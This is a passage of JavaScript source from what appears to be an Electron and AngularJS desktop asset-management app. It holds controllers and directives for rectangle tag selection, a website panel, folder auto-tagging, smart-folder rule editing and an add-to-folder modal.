                        y: rectSelection.startY
                    };

                if ($scope.layout === "JustifiedLayout") {
                    a.x += offsetX;
                }

                a.y += offsetY;

                var subFolderHeight = $("#sub-folder-container").height();
                if (subFolderHeight) {
                    a.y += subFolderHeight + 20;
                }

                return !(
                    ((a.y + a.height) < (b.y)) ||
                    (a.y > (b.y + b.height)) ||
                    ((a.x + a.width) < b.x) ||
                    (a.x > (b.x + b.width))
                );
            };
        }
    }
})

var tagRectSelecting = false;

EagleApp.directive('tagSelect', function($rootScope, $filter) {
    return {
        link: ($scope, element) => {

            tagRectSelecting = false;

            let tagRectSelection = {};
            let startX, startY;
            let offset = $(element).offset();
            const $rect = $('<div class="rect""></div>').hide();
            let tagItems = [];
            let $container;
            let windowHeight;

            const contain = (element) => {
                const a = {
                    width: element.width,
                    height: element.height,
                    x: element.left,
                    y: element.top,
                }, b = {
                    width: tagRectSelection.w,
                    height: tagRectSelection.h,
                    x: tagRectSelection.startX,
                    y: tagRectSelection.startY
                };
                const isContain = !(
                    ((a.y + a.height) < (b.y)) ||
                    (a.y > (b.y + b.height)) ||
                    ((a.x + a.width) < b.x) ||
                    (a.x > (b.x + b.width))
                );
                return isContain;
            };

            const drawRect = () => {
                $rect.css({
                    transform: "none",
                    top: tagRectSelection.startY,
                    left: tagRectSelection.startX,
                    width: tagRectSelection.w,
                    height: tagRectSelection.h,
                    opacity: 1
                });
            };

            const hideRect = () => {
                $rect.css({
                    top: 0,
                    left: 0,
                    width: 0,
                    height: 0,
                    display: "none !important",
                    transform: "none",
                    opacity: 0
                });
            };

            const onMouseDown = (e) => {

                if (e.metaKey || e.ctrlKey || e.shiftKey) {
                    e.stopPropagation();
                    e.preventDefault();
                    return;
                }

                tagItems = [];
                tagRectSelection = {};
                $container = $(element).find(".tag-manager-container");
                $rect.appendTo($container);
                windowHeight = $(window).height();
                tagRectSelection = {};

                if (e.which != 1 || $scope.isDetailMode) return;

                offset = $container.offset();
                if (!offset) return;


                const displayData = $bodyScope.TagManager.tagsResult.display;
                const columnWidth = $bodyScope.TagManager.tagsResult.columnWidth;
                const tagWidth = $container.find(".tag").width();
                const gapWidth = columnWidth - tagWidth;
                const containerPaddingLeft = parseInt($container.css("padding-left"));
                const containerPaddingTop = parseInt($container.css("padding-top"));

                // 計算所有 tags 的位置
                displayData.forEach((vsRepeatItem) => {
                    if (vsRepeatItem.type === "row") {
                        const y = vsRepeatItem.y;
                        vsRepeatItem.tags.forEach((tag, index) => {
                            tagItems.push({
                                width: columnWidth - gapWidth,
                                height: 27,
                                left: index * columnWidth + containerPaddingLeft,
                                top: y + containerPaddingTop,
                                name: tag
                            });
                        });
                    }
                });

                $scope.selectedTags = {};
                $scope.selectingTags = {};

                tagRectSelection.startX = startX = e.pageX - offset.left;
                tagRectSelection.startY = startY = e.pageY - offset.top + $container.scrollTop();
                tagRectSelecting = true;

                if ($container.length == 0) {
                    $container.prepend($rect);
                }

                $rect.css({
                    opacity: 1,
                    transform: "none",
                    top: tagRectSelection.startY,
                    left: tagRectSelection.startX,
                });

                $rect.show();
                $rootScope.currentFocus = "content";
                $scope.$evalAsync();
            };

            const onMouseUp = (e) => {
                if (!tagRectSelecting) return;
                if ($scope.isDetailMode) return;

                hideRect();

                tagRectSelection = {};
                tagRectSelecting = false;

                $bodyScope.selectedTags = { ...$scope.selectingTags };
                $scope.selectingTags = {};
                $bodyScope.$evalAsync();
            };

            const onMouseMove = (e) => {
                if (!tagRectSelecting) return;

                const scrollTop = $container.scrollTop();
                const flipX = startX > e.pageX - offset.left;
                const flipY = startY > e.pageY - offset.top + scrollTop;

                tagRectSelection.w = Math.abs((e.pageX - offset.left) - startX);
                tagRectSelection.h = Math.abs((e.pageY - offset.top) - startY + scrollTop);

                // Note: electron@2.0.2 开始，滑鼠拖拽在窗口边缘不会自动滚动，所以自己处理
                if (e.pageY <= offset.top + 24) {
                    $container.scrollTop(scrollTop - 48);
                }
                else if (e.pageY >= windowHeight - 24) {
                    $container.scrollTop(scrollTop + 48);
                }

                if (flipX) {
                    tagRectSelection.startX = startX - tagRectSelection.w;
                }
                if (flipY) {
                    tagRectSelection.startY = startY - tagRectSelection.h;
                }

                drawRect();
                
                if (tagItems.length > 0) {
                    $scope.selectingTags = {};
                    for (let i = 0; i < tagItems.length; i++) {
                        const tagName = tagItems[i].name;
                        if (!tagName) { continue; };
                        if (contain(tagItems[i])) {
                            $scope.selectingTags[tagName] = true;
                        }
                    }
                    $scope.$evalAsync();
                }
            };

            element.on("mousedown", onMouseDown);
            $(window).on("mouseup", onMouseUp);
            $(window).on("mousemove", onMouseMove);
        }
    }
});

EagleApp.directive("autoFocus", function($rootScope, $timeout) {
    return {
        restrict: "A",
        link: function(scope, ele, attrs) {
            var delay = attrs.autoFocusDelay || 100;
            scope.$on(attrs.autoFocus, function(e) {
                $timeout(function() {
                    $(ele).trigger("click");
                    $(ele).focus();
                    $(ele).select();
                }, delay);
            })
        }
    }
})
EagleApp.controller("WebsitePanelController", function($scope, $rootScope) {

    $scope.currentUrl = "";

    $scope.$watch('theme', function(newValue, oldValue) {
        if ($bodyScope.theme) {
            let webview = $("#website-panel webview")[0];
            if (webview) {
                try {
                    webview.executeJavaScript(`
                        localStorage["theme"] = "${$bodyScope.theme}";
                        document.querySelector("html").setAttribute("theme", "${$bodyScope.theme}");
                    `, true);
                }
                catch (e) {}
            }
        }
    });

    $scope.$on("OPEN_URL_IN_PANEL", function (e, url) {
        $scope.currentUrl = url;
        let webview = $("#website-panel webview")[0];
        if (webview.src.indexOf("community-") === -1) {
            $("#website-panel webview").attr("src", `${$scope.currentUrl}`);   
        }
        $bodyScope.isOpenWebpagePanel = true;
    });

    $scope.goBack = function () {
        let webview = $("#website-panel webview")[0];
        if (webview.canGoBack()) {
            webview.goBack();
        }
    };

    $scope.goForward = function () {
        let webview = $("#website-panel webview")[0];
        if (webview.canGoForward()) {
            webview.goForward();
        }
    };

    $scope.openInBrowser = function () {
        shell.openExternal($("#website-panel webview")[0].src);
    };

    $scope.refresh = function () {
        let webview = $("#website-panel webview")[0];
        webview.reload();
    };
});


EagleApp.directive('websitePanelWebview', function() {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {

            var webview = element[0];
            
            webview.addEventListener('dom-ready', (e) => {
                try {
                    webview.executeJavaScript(`
                        localStorage["theme"] = "${$bodyScope.theme}";
                        document.querySelector("html").setAttribute("theme", "${$bodyScope.theme}");
                    `, true);
                } catch (e) {}
                webview.focus();
                window.blur();
                window.focus();
                if (webview.src.indexOf("file:///") > -1) {
                    webview.clearHistory();
                    webview.loadURL(`${$bodyScope.currentUrl}`);
                }
            });

            webview.addEventListener('page-title-updated', (e) => {
                let title = webview.getURL();
                $("#website-panel-webview-title").html(title);
                
                if (webview.canGoForward()) {
                    $("#website-panel-webview-go-forward").removeClass("disabled");
                }
                else {
                    $("#website-panel-webview-go-forward").addClass("disabled");
                }
                if (webview.canGoBack()) {
                    $("#website-panel-webview-go-back").removeClass("disabled");
                }
                else {
                    $("#website-panel-webview-go-back").addClass("disabled");
                }
            });
        }
    };
});
EagleApp.controller("AutoTaggingController", function($scope, $timeout, $rootScope, $filter) {
    var ipcRenderer = require('electron').ipcRenderer;
    $scope.isOpen = false;
    $scope.folderName = "";
    $scope.folderTags = [];
    $scope.tabIndex = -1;

    $scope.$on("FOLDER_SETTINGS", function(e, folder) {
        $scope.folder = folder;
        $scope.isOpen = true;
        $scope.folderName = folder.name;
        $scope.folderTags = [];
        $scope.originalTags = folder.tags.join(",");

        if (folder.tags && folder.tags.length > 0) {
            folder.tags.forEach(function (tag) {
                $scope.folderTags.push(tag);
            });
        }
        $timeout(function () {
            $scope.tabIndex = 101;
            $("#auto-tagging-name-input").attr("tabindex", 101);
        }, 100);
    });

    $scope.nameKeydown = function(event) {
        var keyCode = event.keyCode;
        if (keyCode === 27) {
            $scope.cancel();
        }
        else if (keyCode === 13) {
            if (event.metaKey || event.ctrlKey) {
                $(event.target).blur();
                $scope.save();
            }
        }
    };

    $scope.save = function() {

        $scope.isOpen = false;
        var needUpdateFolder = $scope.folderName !== $scope.folder.name;
        $scope.folder.name = $scope.folderName;
        $scope.folder.tags = [];
        $scope.folderTags.forEach(function (tag) {
            $scope.folder.tags.push(tag);
        });

        $scope.currentFolderChildren = getChildFoldersMap($scope.folder);

        var needUpdateTags = true;

        if ($scope.originalTags === $scope.folder.tags.join(",")) {
            needUpdateTags = false;
        }
        
        // 將標籤加入到資料夾的圖片中
        if (needUpdateTags) {
            $scope.raw.forEach(function (image) {
                if ( isInFolder(image, $scope.folder, true) ) {
                    if (image.tags) {
                        var tags = image.tags.join();
                        $scope.folder.tags.forEach(function(tag) {
                            image.tags.push(tag);
                        });
                        image.tags = [...new Set(image.tags)];
                        if (tags != image.tags.join()) {
                            ipcRenderer.send('image-change', image);
                        }
                    }
                }
            });
        }

        // 有更动才需要更新
        if (needUpdateFolder || needUpdateTags) {
            $rootScope.$broadcast("SAVE_FOLDER");
            $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
            $rootScope.$broadcast("UPDATE_SELECTION");
            try {
                electronLog && electronLog.info(`[app] Change folder auto-tags: ${$scope.folder.name}(${$scope.folder.id}) tags: ${JSON.stringify($scope.folderTags)}`);
            } catch (err) {};
        }

        $("#auto-tagging-name-input").attr("tabindex", -1);
    };
    $scope.cancel = function() {
        $scope.folder = undefined;
        $scope.isOpen = false;
        $("#auto-tagging-name-input").attr("tabindex", -1);
    };

    // 判断图片是否属于当前文件夹
    function isInFolder (image, folder, ignore) {

        // 状况1: 该资料夹本身包含图片
        var isContain = image.folders.indexOf(folder.id) > -1;
            
            // 加速版本作法，更快判断图片是否存在于子文件夹
        if ($scope.currentFolderChildren) {
            for (var i = 0; i < image.folders.length; i++) {
                var folderId = image.folders[i];
                if ($scope.currentFolderChildren[folderId]) {
                    return true;
                }
            }
        }
        else {
            eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                if (image.folders && image.folders.length > 0 && image.folders.indexOf(child.id) > -1) {
                    isContain = true;
                    return;
                }
            });
        }

        return isContain;
    }

    function getChildFoldersMap (folder) {
        var childs = {};
        eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
            childs[child.id] = true;
        });
        return childs;
    }
});






EagleApp.controller("NewSmartFolderController", function($scope, $timeout, $rootScope, $filter) {
    var ipcRenderer = require('electron').ipcRenderer;
    var $bodyScope = angular.element("body").scope();
    $scope.smartFolderScope = $scope;
    $scope.parent;
    $scope.isOpen = false;
    $scope.folderName= "";
    $scope.foldersSuggestion = [];
    $scope.conditions = [{
        rules: [{
            property: "name",
            method: "contain",
            value: ""
        }],
        match: "OR",
        boolean: "TRUE"
    }];
    $scope.totalCount = 0;
    $scope.dateOpts1 = {
	    dateFormat: 'Y-m-d',
	    allowInput: false,
        locale: ($scope.language.indexOf('zh') > -1)? "zh": "en",
	    // defaultDate: ["2016-10-20"],
	    onChange: function (selectedDates, dateStr, instance) {
            var rule = angular.element(instance._input).scope().rule;
	    	if (selectedDates.length == 1) {
	    		var date = selectedDates[0].getTime();
                rule.value = [date];
                $scope.recalculateResult();
	    		console.log(date)
	    	}
	    }
	};
	$scope.dateOpts2 = {
	    dateFormat: 'Y-m-d',
	    allowInput: false,
        locale: ($scope.language.indexOf('zh') > -1)? "zh": "en",
	    // defaultDate: ["2016-10-20", "2016-11-04"],
	    mode: 'range',
	    onChange: function (selectedDates, dateStr, instance) {
            var rule = angular.element(instance._input).scope().rule;
	    	if (selectedDates.length == 2) {
	    		var start = selectedDates[0].getTime();
	    		var end = selectedDates[1].getTime();
                rule.value = [start, end];
                $scope.recalculateResult();
	    		console.log(start, end)
	    	}
	    }
	};

    $scope.datePostSetup = function (fpItem, rule) {
        var value = rule.value;
        if (value.length === 1) {
            fpItem.setDate(new Date(value[0]))
        }
        else if (value.length === 2) {
            fpItem.setDate([
                new Date(value[0]),
                new Date(value[1])
            ]);
        }
    };

    $scope.$on("NEW.SMART.FOLDER", function(e, { smartFolder, parent }) {
        $scope.init();
        $scope.parent = undefined;
    	$scope.isOpen = true;
        $scope.smartFolder = undefined;
        $scope.folderName= '';
        $scope.conditions = [{
            rules: [{
                property: "name",
                method: "contain",
                value: ""
            }],
            match: "OR",
            boolean: "TRUE"
        }];
        $scope.originSmartFolder = smartFolder;
        if (!parent) {
            if (smartFolder && smartFolder.parent && $bodyScope.smartFolderMappings[smartFolder.parent]) {
                $scope.parent = $bodyScope.smartFolderMappings[smartFolder.parent];
            }
        }
        else {
            $scope.parent = $bodyScope.smartFolderMappings[parent.id];
        }
        $timeout(function () {
            $("#smart-folder-name-input").focus();
        }, 100);
    });

    $scope.$on("EDIT.SMART.FOLDER", function(e, smartFolder) {
        $scope.init();
        if (smartFolder) {
            var sf = angular.copy(smartFolder);
            $scope.isEditMode = true;
            $scope.smartFolder = smartFolder;
            $scope.isOpen = true;
            $scope.folderName= sf.name;
            $scope.conditions = sf.conditions;
            $scope.conditions.forEach(function (condition) {
                if (!condition.boolean) {
                    condition.boolean = "TRUE";
                }
            });
        }
        $scope.recalculateResult();
        $timeout(function () {
            $("#smart-folder-name-input").focus();
        }, 100);
    });

    $scope.init = function () {
        $scope.foldersSuggestion = [];
        eagle.utils.tree.walk($bodyScope.folders, 'children', function(folder, parent) {
            $scope.foldersSuggestion.push({
                value: folder.id,
                text: folder.name
            });
        });
    }

    $scope.nameKeydown = function(event) {
        var keyCode = event.keyCode;
        if (keyCode === 27) {
            $scope.cancel();
        }
        else if (keyCode === 13) {
            if (event.metaKey || event.ctrlKey) {
                $(event.target).blur();
                $scope.save();
            }
        }
    };

    $scope.createRule = function (condition, index) {
    	if (condition.rules.length >= 30) return;
    	var newRule = {
	        property: "name",
	        method: "contain",
	        value: ""
	    };
	    condition.rules.splice(index, 0, newRule);
        $scope.recalculateResult();
    };

    $scope.removeRule = function (condition, rule) {
        if (condition.rules.length == 1) return;
        var idx = condition.rules.indexOf(rule);
        if (idx > -1) {
            condition.rules.splice(idx, 1);
            $scope.recalculateResult();
        }
    };

    $scope.createCondition = function (index) {
        if ($scope.conditions.length >= 30) return;
        var newCondition = {
            rules: [{
                property: "name",
                method: "contain",
                value: ""
            }],
            match: "OR",
            boolean: "TRUE"
        };
        $scope.conditions.splice(index, 0, newCondition);
        $scope.recalculateResult();
    };

    $scope.removeCondition = function (condition) {
    	if ($scope.conditions.length === 0) return;
    	var idx = $scope.conditions.indexOf(condition);
    	if (idx > -1) {
    		$scope.conditions.splice(idx, 1);
            $scope.recalculateResult();
    	}
    };

    $scope.changeProperty = function (rule) {
    	switch(rule.property) {
    		case 'name':
    		case 'url':
    		case 'annotation':
            case 'camera':
    			rule.method = "contain";
    			rule.value = "";
    			break;
			case 'width':
    		case 'height':
    			rule.method = ">";
    			rule.value = [480, 0];
    			break;
            case 'fileSize':
                rule.method = ">";
                rule.value = [1, 0];
                rule.unit = 'mb';
                break;
			case 'shape':
    			rule.method = "equal";
    			rule.value = "landscape";
    			break;
            case 'rating':
                rule.method = "equal";
                rule.value = "5";
                break;
			case 'type':
    			rule.method = "equal";
    			rule.value = eagle.filter.filterTypes[0] || "png";
    			break;
			case 'color':
    			rule.method = "similar";
    			rule.value = "#0087EF";
    			break;
			case 'tags':
    			rule.method = "intersection";
    			rule.value = [];
    			break;
            case 'folders':
                rule.method = "intersection";
                rule.value = [];
                break;
			case 'createTime':
    			rule.method = "before";
    			rule.value = [];
    			// $scope.dateOpts = singleDate;
    			break;
            case 'mtime':
                rule.method = "before";
                rule.value = [];
                break;
            case 'btime':
                rule.method = "before";
                rule.value = [];
                break;
            case 'duration':
                rule.method = "<=";
                rule.value = [30, 0];
                rule.unit = 's';
                break;
            case 'bpm':
                rule.method = ">=";
                rule.value = [160, 0];
                break;
            case 'iso':
                rule.method = ">";
                rule.value = [100, 0];
                break;
            case 'aperture':
                rule.method = ">";
                rule.value = [3.5, 0];
                break;
            case 'focalLength':
                rule.method = ">";
                rule.value = [20.0, 0];
                break;
            case 'shutter':
                rule.method = ">";
                rule.value = [100.0, 0];
                break;
            case 'timestamp':
                rule.method = "before";
                rule.value = [];
                break;
            case 'fontActivated':
                rule.method = "activate";
                break;
    	}
        $scope.recalculateResult();
    };

    $scope.changeMethod = function (rule) {
    	switch(rule.property) {
    		case 'createTime':
            case 'mtime':
            case 'btime':
    			if (rule.method === 'between') {
    				rule.value = "";
    			}
                else if (rule.value.indexOf("~") > -1) {
                    rule.value = "";
                }
                else if (rule.method === 'within') {
                    rule.value[0] = 30;
                }
    			break;
    	}
        $scope.recalculateResult();
    };

    $scope.changeValue = function (rule, tags) {
        $scope.recalculateResult();
    };

    $scope.recalculateResult = function () {
        var $bodyScope = angular.element("body").scope();

        $bodyScope.currentSmartFolder = {
            "name": "",
            "conditions": $scope.conditions
        };
        if ($scope.smartFolder && $scope.smartFolder.parent) {
            $bodyScope.currentSmartFolder.parent = $scope.smartFolder.parent;
        }
        var result = $filter('filter')($bodyScope.raw, $bodyScope.contentFilter);
        var totalCount = result.length;
        $scope.totalCount = totalCount;
        $bodyScope.rebindRefresh();
    }; 

    $scope.save = function () {
        if (!$scope.folderName) {
            $scope.isNoFolderName = true;
            return;
        }
        else {
            $scope.isNoFolderName = false;
        }
        var $bodyScope = angular.element("body").scope();

        if (!$scope.isEditMode) {

            var smartFolder = {
                "id": guid(),
                "name": $scope.folderName,
                "conditions": $scope.conditions,
                "modificationTime": Date.now(),
                "children": []
            };

            let children = $bodyScope.smartFolders;
            if ($scope.parent) {
                if (!$scope.parent.children) {
                    $scope.parent.children = [];
                }
                children = $scope.parent.children;
                smartFolder.parent = $scope.parent.id;
                $scope.parent.isExpand = true;
            }

            var idx = children && children.length || 0;
            if ($scope.originSmartFolder) {
                idx = children.indexOf($scope.originSmartFolder) + 1;
            }

            children.splice(idx, 0, smartFolder);
            smartFolder.imageCount = $bodyScope.smartFolderCount(smartFolder);
            $bodyScope.smartFolderMappings[smartFolder.id] = smartFolder;
            $bodyScope.updateSidebarList();
            $bodyScope.openSmartFolder(smartFolder);
            setTimeout(function () { $bodyScope.changeSidebarIndex(smartFolder); }, 400);
            try {
                electronLog && electronLog.info(`[app] Create new smart-folder: ${smartFolder.name}(${smartFolder.id})`);
                electronLog && electronLog.info(`${JSON.stringify(smartFolder)}`);
                analytics.event('SmartFolder', 'Create', smartFolder.name);
            } catch (err) {}
        }
        else {
            $scope.smartFolder.name = $scope.folderName;
            $scope.smartFolder.conditions = $scope.conditions;
            $scope.smartFolder.modificationTime = Date.now();
            $scope.smartFolder.imageCount = $bodyScope.smartFolderCount($scope.smartFolder);
            if ($scope.smartFolder) {
                $bodyScope.updateSidebarList();
                $bodyScope.openSmartFolder($scope.smartFolder);
                setTimeout(function () { $bodyScope.changeSidebarIndex($scope.smartFolder); }, 400);
                try {
                    electronLog && electronLog.info(`[app] Edit smart-folder: ${$scope.smartFolder.name}(${$scope.smartFolder.id})`);
                    electronLog && electronLog.info(`${JSON.stringify($scope.smartFolder)}`);
                    analytics.event('SmartFolder', 'Rename', smartFolder.name);
                } catch (err) {}

                setTimeout(function () {
                    eagle.utils.tree.walk($scope.smartFolder.children, 'children', function (csf, parent, depth) {
                        csf.imageCount = $scope.smartFolderCount(csf);
                    });
                    $scope.$evalAsync();
                }, 200);
            }
        }
        $bodyScope.saveFolder();
        $scope.isEditMode = undefined;
        $scope.smartFolders = undefined;
        $scope.isOpen = false;
        $("#smart-folder-name-input").attr("tabindex", -1);
    };

    $scope.cancel = function() {
        var $bodyScope = angular.element("body").scope();
        // if ($scope.smartFolder) {
        //     $bodyScope.openSmartFolder($scope.smartFolder, false);
        // }
        $("#smart-folder-name-input").attr("tabindex", -1);
        if ($scope.isEditMode) {
            $bodyScope.currentSmartFolder = $scope.smartFolder || undefined;
        }
        else {
            $bodyScope.currentSmartFolder = $scope.originSmartFolder || undefined;
        }
        $scope.folder = undefined;
        $scope.isEditMode = undefined;
        $scope.isOpen = false;
        $bodyScope.rebindRefresh();
        // $bodyScope.filterContent();
        $bodyScope.$evalAsync();
    };
});

EagleApp.controller("AddToFolderController", function($scope, $timeout, $rootScope, $filter) {

    $scope.isOpen = false;
    $scope.currentIndex;
    $scope.showCreateButton = false;
    $scope.filterFolderKeyword = "";
    $scope.folders = [];
    $scope.resultList = [];
    $scope.folderMappings = {};
    $scope.selectedFolders = {};
    $scope.isRemoveFromOriginal = localStorage.getItem("isRemoveFromOriginal") || 'false';

    var $bodyScope = angular.element("body").scope();
    var recentMoveFolders;

    var watchers = {
        openModal: function(e, params) {
            $scope.images = params.images;
            $scope.current = params.current;
            $scope.existsFolders = params.existsFolders;
            $scope.folders = [];
            $scope.selectedFolders = {};

            // 與外界隔離，不需要使用 body scope 的 folders
            cloneTree($scope.folders, params.folders);

            // 预设展开所有第一层
            $scope.folders.forEach(function (folder) {
                folder.isExpand = true;
            });

            eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent) {
                $scope.folderMappings[folder.id] = folder;
                if (folder && parent) {
                    folder.parent = parent.id;
                }
                for (var i = 0; i < $scope.existsFolders.length; i++) {
                    var existsFolder = $scope.existsFolders[i];
                    // 该图片已经收藏在这个文件夹了
                    if (folder.id === existsFolder) {
                        $scope.selectedFolders[folder.id] = true;
                    }
                }
            });

            // 最近使用的文件夹（存id)，去除已经不存在的文件夹
            recentMoveFolders = localStorage.getItem("recentMoveFolders");
            if (recentMoveFolders) {
                recentMoveFolders = JSON.parse(recentMoveFolders);
                recentMoveFolders = recentMoveFolders.slice(0, 8);
            }
            else {
                recentMoveFolders = [];
            }

            $scope.recentMoveFolders = recentMoveFolders.filter(function (folderId) {
                return !!$bodyScope.folderMappings[folderId];
            });

            $scope.filterFolderKeyword = "";
            $scope.renderFolderList();
            $scope.selectedFolder = $scope.resultList[0];

            $timeout(function () {
                $scope.isOpen = true;
            }, 70);
        }
    };

    $scope.$on("OPEN-ADD-FOLDER-MODAL", watchers.openModal);
    $scope.$watch("isRemoveFromOriginal", function (newValue) {
        localStorage.setItem("isRemoveFromOriginal", newValue);
    });

    $scope.changeCurrentIndex = function (node) {
        var idx = $scope.resultList.indexOf(node);
        if (idx !== -1) {
            $scope.currentIndex = idx; 
        }
    };

    function getFolderList () {

        let list = [];
        let isFiltering = !!$scope.filterFolderKeyword;
        let guidelinesMap = {};

        eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent, depth) {

            // 計算 guidelines 顏色及數量
            let guidelines = [];
            if (parent && guidelinesMap[parent.id]) {
                const parentGuidelines = guidelinesMap[parent.id];
                guidelines = [...parentGuidelines, folder.iconColor || 'normal'];
            }
            else {
                guidelines = [folder.iconColor || 'normal'];
            }
            guidelinesMap[folder.id] = guidelines;

            var idx;
            folder.size = 27;
            folder.vstype = 'folder';
            folder.guidelines = guidelines.slice(0, guidelines.length - 1);
            folder.styles = {
                depth: depth,
                first: false,
                last: false
            };

            if (parent) {
                folder.isVisible = folder.isExpand && parent.isVisible;
            }
            else {
                folder.isVisible = folder.isExpand;
            }

            if (depth !== 0 && parent && parent.children) {
                idx = parent.children.indexOf(folder);
                if (idx === 0 && parent.children.length > 1) {
                    folder.styles.first = true;
                    folder.styles.last = false;
                }
                else if (idx === 0 && parent.children.length === 1) {
                    folder.styles.first = false;
                    folder.styles.last = true;
                }
                else if (idx === parent.children.length - 1) {
                    folder.styles.first = false;
                    folder.styles.last = true;
                }
                else {
                    folder.styles.first = false;
                    folder.styles.last = false;
                }
            }
            if (folder && folder.isExpand && folder.children.length > 0) {
                folder.styles.last = true;
            }

            // 决定是否要在画面上显示
            if (!parent) {
                list.push(folder);
            }
            else if (isFiltering) {
                list.push(folder);
            }
            else {
                if (folder && parent.isVisible) {
                    list.push(folder);
                }
            }
        });
        return list;
    };

    $scope.renderFolderList = function () {

        var list = [];
        var folderList = getFolderList();
        var folderLabel = { vstype: 'label-folder', size: 25 };
        var createFolderItem = { vstype: 'createFolder', size: 28 };

        // folderList = $filter('filter')(folderList, $scope.folderMoveSearchFilter);
        folderList = filterFolders(folderList, $scope.filterFolderKeyword);

        if ($scope.filterFolderKeyword.length <= 0) {

            if ($scope.recentMoveFolders.length > 0) {
                list.push({ vstype: 'separator', size: 8 });
            }

            $scope.recentMoveFolders.forEach(function (recentFolderId) {
                if (recentFolderId && $bodyScope.folderMappings[recentFolderId]) {
                    var folder = angular.copy($bodyScope.folderMappings[recentFolderId]);
                    folder.size = 28;
                    folder.styles = {
                        depth: 0,
                        first: false,
                        last: false
                    };
                    folder.vstype = "recentFolder";
                    list.push(folder);
                }
            });

            // if (list.length > 0) {
                list.push({ vstype: 'separator', size: 8 });
            // }
            list.push(folderLabel);
        }
        else {
            list.push({ vstype: 'separator', size: 8 });
        }

        list = list.concat(folderList);


        // 计算是否需要显示创建按钮
        $scope.showCreateButton = false;
        if ($scope.filterFolderKeyword) {
            $scope.showCreateButton = true;
            for (var i = 0; i < list.length; i++) {
                var folder = list[i];
                if (folder.name === $scope.filterFolderKeyword) {
                    $scope.showCreateButton = false;
                    break;
                }
            }
        }

        if ($scope.showCreateButton) {
            list.push(createFolderItem);
        }

        $scope.resultList = list;
    };

    $scope.getMoveFolderItemClass = function (node, folderName, selectedFolder) {
        var result = {
            'hover active-item': node == selectedFolder,
            'checked': $scope.selectedFolders[node.id],
            'collapsed': !node.isExpand && !$scope.filterFolderKeyword,
            'empty-node': node.children && node.children.length == 0,
            'color-red': node.iconColor == 'red',
            'color-orange': node.iconColor == 'orange',
            'color-yellow': node.iconColor == 'yellow',
            'color-green': node.iconColor == 'green',
            'color-aqua': node.iconColor == 'aqua',
            'color-blue': node.iconColor == 'blue',
            'color-purple': node.iconColor == 'purple',
            'color-pink': node.iconColor == 'pink',
            'close': node.children && node.children.length <= 0 && node.isExpand,
        };

        result['icon-' + node.icon] = true;
		let parent = $scope.folderMappings[node.parent];
		if (parent) {
			result[`parent-color-${parent?.iconColor}`] = true;
		}
        return result;
    };

    $scope.toggleFolder = function (event, folder) {
        event.stopPropagation();
        if ($scope.filterFolderKeyword) {
            folder.isExpand = !folder.isExpand;
            folder.showChildren = !folder.showChildren;
        }
        else {
            // 如果用户点击了 ⌘ + alt，展开/收起所有层级
            if (event.altKey && (event.metaKey || event.ctrlKey)) {
                var expand = !folder.isExpand;
                toggleAllFolders($scope.folders, expand);
            }
            // 如果用户点击 ⌘，展开/收起第一层
            else if (event.metaKey || event.ctrlKey) {
                var expand = !folder.isExpand;
                var parent = $scope.folderMappings[folder.parent];
                var folders = $scope.folders;
                if (parent && parent.children) {
                    folders = parent.children;
                }
                toggleCurrentLevelFolders(folders, expand);
            }
            else if (event.altKey) {
                var expand = !folder.isExpand;
                var folders = folder.children;
                folder.isExpand = expand;
                toggleCurrentLevelFolders(folders, expand);
            }
            else {
                folder.isExpand = !folder.isExpand;
            }
        }
        $scope.renderFolderList();
        $scope.focusSeach();
    };

    function toggleAllFolders (folders, isExpand) {
        eagle.utils.tree.walk(folders, 'children', function(f, parent) {
            if (f.isExpand !== isExpand) {
                f.isExpand = isExpand;
            }
        });
    };

    function toggleCurrentLevelFolders (folders, isExpand) {
        folders.forEach(function (f) {
            if (f.isExpand !== isExpand) {
                f.isExpand = isExpand;
            }
        });
    };

    $scope.selectPrevFolder = function () {
        var currentIndex = $scope.resultList.indexOf($scope.selectedFolder);
        var target;
        if (currentIndex === -1) {
            $scope.selectedFolder = $scope.resultList[0];
        }
        else {
            $scope.selectedFolder = $scope.resultList[currentIndex - 1] || $scope.resultList[0];
        }
        if (currentIndex > 0 && $scope.selectedFolder.vstype !== 'folder' && $scope.selectedFolder.vstype !== 'recentFolder'&& $scope.selectedFolder.vstype !== 'createFolder') {
            $scope.selectPrevFolder();
        }
        $scope.changeCurrentIndex($scope.selectedFolder);
        $scope.searchScrollEnable = true;
    };

    $scope.selectNextFolder = function () {
        var currentIndex = $scope.resultList.indexOf($scope.selectedFolder);
        var target;
        if (currentIndex === -1) {
            $scope.selectedFolder = $scope.resultList[0];
        }
        else {
            $scope.selectedFolder = $scope.resultList[currentIndex + 1] || $scope.resultList[$scope.resultList.length - 1];
        }
        if (currentIndex < $scope.resultList.length -1 && $scope.selectedFolder.vstype !== 'folder' && $scope.selectedFolder.vstype !== 'recentFolder'&& $scope.selectedFolder.vstype !== 'createFolder') {
            $scope.selectNextFolder();
        }
        $scope.changeCurrentIndex($scope.selectedFolder);
        $scope.searchScrollEnable = true;
    };

    $scope.keywordChange = function () {

        // 一律清除強制展開的功能
        eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent) {
            delete folder.showChildren;
        });

        $scope.renderFolderList();
        $scope.selectedFolder = $scope.resultList[0];
        $scope.scrollToTop();
    };

    $scope.onSearchKeyup = function(event) {
        var keyCode = event.keyCode;
        if (keyCode === 38) {
            event.preventDefault();
            $scope.selectPrevFolder();
        } else if (keyCode === 40) {
            event.preventDefault();
            $scope.selectNextFolder();
        } else if (keyCode === 37) {
            if ($scope.selectedFolder) {
                $scope.selectedFolder.isExpand = false;
                $scope.selectedFolder.showChildren = false;
                $scope.renderFolderList();
            }
        } else if (keyCode === 39) {
            if ($scope.selectedFolder) {
                $scope.selectedFolder.isExpand = true;
                $scope.selectedFolder.showChildren = true;
                $scope.renderFolderList();
            }
        } else if (keyCode === 27) {
            event.preventDefault();
            $scope.cancel();
        } else if (keyCode === 13) {
            if (event.metaKey || event.ctrlKey) {
                event.preventDefault();
                $scope.save();
            }
            else {
                $scope.select($scope.selectedFolder);
            }
        }
    };

    $scope.scrollToTop = function () {
        $(".move-to-folder-modal .sidebar-item-container").scrollTop(0);
    };

    function filterFolders (folders, keyword) {

        if (!keyword) return folders;
        var keyword_cn = chineseConvert.tw2cn(keyword);

